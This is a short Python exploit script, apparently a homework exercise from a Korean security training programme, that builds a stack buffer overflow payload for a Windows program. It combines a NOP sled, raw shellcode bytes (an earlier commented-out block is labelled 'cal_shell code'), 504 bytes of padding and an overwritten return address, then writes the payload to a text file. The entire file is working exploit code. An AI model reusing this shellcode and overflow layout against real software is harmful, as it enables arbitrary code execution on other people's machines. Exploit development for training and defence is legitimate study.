import struct

NOP = b"\x90" * 4
#cal_shell code
# buf =  (
# b"\xda\xc8\xbd\xb8\xc7\xc4\xcb\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
# b"\x30\x31\x68\x18\x83\xe8\xfc\x03\x68\xac\x25\x31\x37\x24\x2b"
# b"\xba\xc8\xb4\x4c\x32\x2d\x85\x4c\x20\x25\xb5\x7c\x22\x6b\x39"
# b"\xf6\x66\x98\xca\x7a\xaf\xaf\x7b\x30\x89\x9e\x7c\x69\xe9\x81"
# b"\xfe\x70\x3e\x62\x3f\xbb\x33\x63\x78\xa6\xbe\x31\xd1\xac\x6d"
# b"\xa6\x56\xf8\xad\x4d\x24\xec\xb5\xb2\xfc\x0f\x97\x64\x77\x56"
# b"\x37\x86\x54\xe2\x7e\x90\xb9\xcf\xc9\x2b\x09\xbb\xcb\xfd\x40"
# b"\x44\x67\xc0\x6d\xb7\x79\x04\x49\x28\x0c\x7c\xaa\xd5\x17\xbb"
# b"\xd1\x01\x9d\x58\x71\xc1\x05\x85\x80\x06\xd3\x4e\x8e\xe3\x97"
# b"\x09\x92\xf2\x74\x22\xae\x7f\x7b\xe5\x27\x3b\x58\x21\x6c\x9f"
# b"\xc1\x70\xc8\x4e\xfd\x63\xb3\x2f\x5b\xef\x59\x3b\xd6\xb2\x37"
# b"\xba\x64\xc9\x75\xbc\x76\xd2\x29\xd5\x47\x59\xa6\xa2\x57\x88"
# b"\x83\x5d\x12\x91\xa5\xf5\xfb\x43\xf4\x9b\xfb\xb9\x3a\xa2\x7f"
# b"\x48\xc2\x51\x9f\x39\xc7\x1e\x27\xd1\xb5\x0f\xc2\xd5\x6a\x2f"
# b"\xc7\xb5\xed\xa3\x8b\x39"
# )
# mov bx, 05dc
# sub ebp, ebx
buf = (
b"\x81\xec\x05\xdc\x90\x90"
b"\xdd\xc2\xd9\x74\x24\xf4\x58\x31\xc9\xbb\x60\xbe\xb3\xed\xb1"
b"\x42\x31\x58\x19\x03\x58\x19\x83\xe8\xfc\x82\x4b\x6a\x06\xd9"
b"\x6d\xf9\xfd\x29\xbc\xd0\x4c\xa6\x8e\x1d\xd4\xc3\x80\xad\x9e"
b"\xa5\x6e\x45\xd6\x55\xe4\x1f\x1f\xee\x84\xbf\x94\xc6\x40\x8f"
b"\xb2\x53\x42\x56\xc2\x4a\x5b\x88\xa4\xe7\xc8\x6f\x01\x7c\x55"
b"\x4c\xc2\xd6\x7e\xd4\xd5\x3c\xf5\x6e\xce\x4b\x50\x4f\xef\xa0"
b"\x86\xbb\xa6\xbd\x7d\x4f\x39\x2f\x4c\xb0\x0b\x6f\x53\xe2\xe8"
b"\xaf\xd8\xfc\x31\xe0\x2c\x02\x75\x15\xda\x3f\x05\xcd\x0b\x35"
b"\x14\x86\x16\x91\xd7\x73\xc0\x52\xdb\xc8\x86\x3f\xf8\xcf\x73"
b"\x34\x04\x44\x82\xa3\x8c\x1e\xa1\x2f\xee\x5d\x1b\x47\xd9\xb5"
b"\xd5\xbd\x90\xf7\x8e\xb3\xed\xf9\xa2\x9e\x19\x9a\xc4\xe0\x25"
b"\x2d\x7f\x1b\x61\x53\x58\xc1\xe6\x2c\x44\x22\x5b\xda\xfb\xd5"
b"\xa4\xe5\x8d\x6f\x53\x71\xe2\x03\x43\xc0\x92\xe8\xb1\xec\x06"
b"\x67\xc3\x83\xa3\x05\x1b\xb8\xa4\xb6\x7f\x34\x3c\xa0\xd6\xb7"
b"\x6b\x29\x5e\x85\xc4\x8a\xc8\xab\xa8\x50\x8f\xb7\x16\xfb\x78"
b"\x98\xa9\x04\x87\x4e\x39\x83\x20\xae\xad\x12\xb6\xcb\x6f\xbd"
b"\x75\x76\x03\x4e\xb7\xa3\x6b\xec\x93\x59\xe5\xee\xb4\x34\xad"
b"\xd0\x64\xae\x28\x64\x09\x45\xdb\xca\xb4\xfc\x48\xe2\xff\x76"
b"\x22\x20\x09\x0f\x5a\x19\xdb\x5d\xce\x0b\x89\x9e\x20\x9a\xed"
b"\x30\x3e\x88\xe5"
)
print("Shellcode Length:", len(buf))
DUMMY = b"A"*(504-len(NOP + buf))
BUF = struct.pack('<L',0x19f568)
print(NOP+buf + DUMMY)
contents = NOP + buf + DUMMY + BUF

f=open("C:\\Users\JBU_Lee\\Desktop\BoB9기\\김현민멘토님-SQL인젝션,Window해킹\\윈도우시스템해킹1_과제\\test.txt","wb")
f.write(contents)
f.close()
